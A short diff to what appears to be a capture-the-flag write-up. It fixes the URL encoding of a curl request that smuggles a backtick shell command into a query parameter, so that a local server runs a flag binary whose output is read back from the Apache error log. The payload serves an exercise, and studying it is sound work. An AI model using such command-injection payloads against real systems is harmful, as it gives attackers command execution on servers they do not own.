@@ -28,7 +28,7 @@ curl 'localhost:4646?x=`/*/GETFLAG>&2`'
 But we need to encode the url first
 
 ```bash
-curl 'localhost:4646?x=`%2F%2A%2FGETFLAG%3E%262`'
+curl 'localhost:4646?x=%60%2F%2A%2FGETFLAG%3E%262%60'
 ```
 
 The result appears in the errors of the server and we have access to the error logs of the apache server
